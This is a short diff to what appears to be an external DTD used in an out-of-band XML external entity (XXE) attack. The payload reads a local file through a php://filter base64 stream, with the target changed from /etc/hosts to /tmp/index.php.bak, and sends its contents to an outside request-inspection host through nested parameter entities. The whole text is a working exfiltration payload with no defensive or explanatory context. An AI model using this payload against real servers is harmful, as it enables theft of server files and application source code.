@@ -1,4 +1,4 @@
-<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/hosts">
+<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=file:///tmp/index.php.bak">
 <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'https://requestinspector.com/inspect/emoth/%payload;'>">
 %int;
 %trick;
